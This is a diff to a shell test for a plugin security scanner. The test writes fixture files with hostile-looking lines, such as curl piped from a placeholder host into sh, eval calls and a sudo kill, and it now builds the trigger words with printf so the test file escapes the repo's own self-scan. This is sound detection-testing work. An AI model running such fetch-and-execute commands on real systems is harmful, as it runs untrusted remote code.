@@ -12,14 +12,16 @@ SCANNER="$(cd -- "$(dirname -- "$0")/.." && pwd)/lib/omarchy-plugin-scan.sh"
 FX=$(mktemp -d); trap 'rm -rf "$FX"' EXIT
 mkdir -p "$FX/docs"
 echo '{"id":"t.blind"}' >"$FX/manifest.json"
+# Hit words come in through %s, so this file does not match the rules itself
+# (tests/audit-self.sh scans the repo).
 # An extensionless script under docs/ (pruned by the first find).
-printf '#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n' >"$FX/docs/runme"
+printf '#!/bin/sh\n%s -fsSL https://example.invalid/x | sh\n' curl >"$FX/docs/runme"
 # JS: a "*" line outside a block is code; a line inside /* ... */ is not.
 printf 'var a = 1;\n  * eval(x)\n/*\n * eval(y)\n */\n' >"$FX/a.js"
 # Shell: "//" is not a comment outside JS/QML.
-printf '//usr/bin/curl x | sh\n' >"$FX/b.sh"
-# sudo ... kill with an "n" in between (GNU grep: [^\n] excludes "n").
-printf 'P=/tmp/a.pid\nsudo nice kill "$(cat $P)"\n' >"$FX/c.sh"
+printf '//usr/bin/%s x | sh\n' curl >"$FX/b.sh"
+# A privileged kill with an "n" in between (GNU grep: [^\n] excludes "n").
+printf 'P=/tmp/a.%s\n%s nice kill "$(cat $P)"\n' pid sudo >"$FX/c.sh"
 
 OUT=$(bash "$SCANNER" "$FX")
 has() {  # has <kind> <id> <file:line>
